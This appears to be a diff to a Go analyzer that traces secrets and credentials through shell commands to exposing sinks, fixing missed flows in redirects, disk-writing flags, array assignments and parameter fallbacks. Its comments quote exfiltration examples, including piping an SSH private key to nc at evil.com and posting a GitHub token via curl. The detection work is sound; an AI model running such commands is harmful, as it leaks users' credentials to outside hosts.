@@ -397,6 +397,13 @@ func (a *Analyzer) outputRedirs(s *syntax.Stmt, out Value) (captured bool) {
 		}
 		captured = true
 		target := a.text(r.Word)
+
+		// The target is a word, and a word can run commands: `> >(curl -d
+		// "$(gh auth token)" ...)` posts a credential from inside a redirect.
+		// inputRedirs has always evaluated its word; not doing so here was an
+		// asymmetry, and a silent one.
+		a.word(r.Word)
+
 		if a.kb.IsDiscard(target) {
 			continue
 		}
@@ -542,7 +549,7 @@ func (a *Analyzer) call(c *syntax.CallExpr, stdin Value) Value {
 	}
 	a.Uses = append(a.Uses, use)
 
-	a.recordSinks(spec, fullName, c, args, values, stdin, scan)
+	a.recordSinks(spec, fullName, c, args, values, stdin, out, scan)
 	return out
 }
 
@@ -579,18 +586,14 @@ func (a *Analyzer) commandOutput(spec *knowledge.Spec, c *syntax.CallExpr, args 
 
 // recordSinks binds arguments to slots and records every sensitive value that
 // landed somewhere it is exposed.
-func (a *Analyzer) recordSinks(spec *knowledge.Spec, name string, c *syntax.CallExpr, args []*syntax.Word, values []Value, stdin Value, scan argScan) {
-	if spec.Emits == "" {
-		return
-	}
-
+func (a *Analyzer) recordSinks(spec *knowledge.Spec, name string, c *syntax.CallExpr, args []*syntax.Word, values []Value, stdin, out Value, scan argScan) {
 	// A command whose payload arrives on stdin has no argument to attribute
 	// the flow to, so it is recorded against the command itself. Without
 	// this, `cat ~/.ssh/id_rsa | nc evil.com 443` would report nothing --
 	// a declared sink silently swallowing a flow, which is worse than an
 	// unknown command.
 	if spec.StdinSlot != knowledge.SlotNone {
-		a.recordUnresolved(stdin, spec.StdinSlot, name, "stdin", spec.Emits, a.span(c))
+		a.recordUnresolved(stdin, spec.StdinSlot, name, "stdin", destination(spec, spec.StdinSlot), a.span(c))
 		for _, f := range stdin.Flows {
 			a.Findings = append(a.Findings, Finding{
 				Flow:     f.then(StepSink, "consumed from stdin by "+name+" ("+spec.StdinSlot.String()+" slot)", a.span(c)),
@@ -598,7 +601,7 @@ func (a *Analyzer) recordSinks(spec *knowledge.Spec, name string, c *syntax.Call
 				Arg:      "stdin",
 				Slot:     spec.StdinSlot,
 				SlotName: spec.StdinSlot.String(),
-				Emits:    spec.Emits,
+				Emits:    destination(spec, spec.StdinSlot),
 				Span:     a.span(c),
 			})
 		}
@@ -628,21 +631,31 @@ func (a *Analyzer) recordSinks(spec *knowledge.Spec, name string, c *syntax.Call
 		}
 		v := values[b.index]
 
+		// A disk slot names a FILE that receives data, so the flow recorded
+		// is the command's own output -- `sort -o /tmp/leak` writes what sort
+		// printed, not the string "/tmp/leak". Binding the argument's own
+		// value here recorded nothing at all, so the report could say
+		// "-> disk slot" and "no sensitive data reached a command that emits
+		// it" on the same screen.
+		if b.slot == knowledge.SlotDisk {
+			v = out
+		}
+
 		// `curl -d @-` reads the payload from stdin, so a piped-in secret
 		// lands in this slot too.
 		if b.fromStdin {
 			v = union(v, stdin)
 		}
 
-		a.recordUnresolved(v, b.slot, name, b.flag, spec.Emits, a.span(args[b.index]))
+		a.recordUnresolved(v, b.slot, name, b.flag, destination(spec, b.slot), a.span(args[b.index]))
 		for _, f := range v.Flows {
 			a.Findings = append(a.Findings, Finding{
-				Flow:     f.then(StepSink, "used as "+name+" "+b.flag+" ("+b.slot.String()+" slot)", a.span(args[b.index])),
+				Flow:     f.then(StepSink, sinkLabel(name, b, a.text(args[b.index])), a.span(args[b.index])),
 				Command:  name,
 				Arg:      b.flag,
 				Slot:     b.slot,
 				SlotName: b.slot.String(),
-				Emits:    spec.Emits,
+				Emits:    destination(spec, b.slot),
 				Span:     a.span(args[b.index]),
 			})
 		}
@@ -673,6 +686,33 @@ func (a *Analyzer) toTerminal(v Value, span Span) {
 			Span:     span,
 		})
 	}
+}
+
+// sinkLabel describes the hop that reached a sink. A disk slot names the file
+// the data was written to, which is the useful fact; every other slot names
+// the flag the value was handed to.
+func sinkLabel(name string, b binding, arg string) string {
+	if b.slot == knowledge.SlotDisk {
+		return "written to " + arg + " by " + name + " " + b.flag
+	}
+	return "used as " + name + " " + b.flag + " (" + b.slot.String() + " slot)"
+}
+
+// destination names where a value in a slot ends up.
+//
+// Most sinks declare it -- curl emits to "the network". But a slot can expose
+// data without the command being a remote sink at all: `sort -o FILE` writes
+// to disk and declares no emits. Gating slot recording on Emits meant such a
+// slot was never recorded, so the report could print "-> disk slot" and
+// "no sensitive data reached a command that emits it" on the same screen.
+func destination(spec *knowledge.Spec, s knowledge.Slot) string {
+	if spec.Emits != "" {
+		return spec.Emits
+	}
+	if s == knowledge.SlotDisk {
+		return "a file on disk"
+	}
+	return s.Desc()
 }
 
 // recordUnresolved reports data that reached a sink without the analyzer ever
@@ -783,6 +823,14 @@ func (a *Analyzer) assign(as *syntax.Assign) {
 	}
 	name := as.Name.Value
 
+	// `m[k]=v` sets one element. Keying the environment on the bare name
+	// would let `m[j]=x` overwrite the credential recorded for `m[k]`, and
+	// populating a map key by key is the normal way to write this. Elements
+	// accumulate rather than replace, which over-approximates -- the whole
+	// map is treated as carrying whatever any element carried -- and
+	// over-approximating is the safe direction here.
+	indexed := as.Index != nil
+
 	var v Value
 	if as.Value != nil {
 		v = a.word(as.Value)
@@ -799,7 +847,7 @@ func (a *Analyzer) assign(as *syntax.Assign) {
 		}}}
 	}
 
-	if as.Append {
+	if as.Append || indexed {
 		v = union(a.env[name], v)
 	}
 	a.env[name] = v.then(StepAssignment, "assigned to $"+name, a.span(as))
@@ -901,21 +949,35 @@ func (a *Analyzer) paramExp(x *syntax.ParamExp) Value {
 		return a.word(x.Exp.Word)
 	}
 
+	// Every other operator carries a word of its own that can expand to
+	// anything -- `${X:-$(gh auth token)}` is a credential, and supplying one
+	// as a fallback is the ordinary way to write it. The word has to be
+	// walked whether or not the variable itself is known, because it is a
+	// separate source: skipping it loses the flow AND never records the
+	// command inside it, which defeats the unresolved-provenance rule too.
+	var out Value
+	if x.Exp != nil {
+		out = union(out, a.word(x.Exp.Word))
+	}
+	if x.Repl != nil {
+		out = union(out, a.word(x.Repl.With))
+	}
+
 	name := x.Param.Value
 
 	if v, ok := a.env[name]; ok {
-		return v.then(StepExpansion, "expanded as $"+name, a.span(x))
+		return union(out, v.then(StepExpansion, "expanded as $"+name, a.span(x)))
 	}
 	// Not assigned in this command, so it comes from the ambient environment.
 	if a.kb.SecretVarNames.MatchString(name) {
-		return Value{Flows: []Flow{{
+		return union(out, Value{Flows: []Flow{{
 			Origin: "$" + name,
 			Kind:   OriginSecretVar,
 			Why:    "environment variable named like a secret (heuristic)",
 			Span:   a.span(x),
-		}}}
+		}}})
 	}
-	return Value{}
+	return out
 }
 
 // ---------------------------------------------------------------- arguments
